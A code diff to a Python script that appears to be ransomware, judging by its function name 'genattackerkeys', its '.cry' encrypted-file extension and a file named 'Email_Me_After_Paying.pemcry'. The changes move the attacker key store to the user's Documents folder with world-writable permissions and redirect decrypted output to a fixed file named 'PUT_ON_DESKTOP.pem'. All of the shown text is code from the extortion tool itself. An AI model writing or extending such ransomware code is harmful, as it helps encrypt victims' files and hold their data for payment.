@@ -13,7 +13,8 @@ def is_non_zero_file(fpath):
 
 # Generates RSA Encryption + Decryption keys / Public + Private keys
 def genattackerkeys():
-    dest_path = "./keysafe"
+    sysRoot = os.path.expanduser('~')
+    dest_path = sysRoot + "/Documents/keysafe"
     try:
         os.makedirs(dest_path, 0o777, exist_ok=True)
     except OSError as err:
@@ -89,7 +90,7 @@ def decrypt_file(filepath, private_key_path):
     if filepath.endswith("cry"):
         dec_blob = decrypt_blob(fileblob, private_key_path)
         filepath = filepath[:-3]
-        with open(filepath, 'wb') as outf:
+        with open('./PUT_ON_DESKTOP.pem', 'wb') as outf:
             outf.write(dec_blob)
     return filepath
 
@@ -118,4 +119,5 @@ def decrypt_blob(encryptedblob, private_key_path):
 if __name__ == '__main__':
     # genattackerkeys()
     # print(encrypt_file("./f1.txt", "../keysafe/public.pem"))
-    print(decrypt_file("./Email_Me_After_Paying.pemcry", "../keysafe/private.pem"))
+    dest_path = os.path.expanduser('~') + "/Documents/keysafe"
+    print(decrypt_file("./Email_Me_After_Paying.pemcry", dest_path + "/private.pem"))
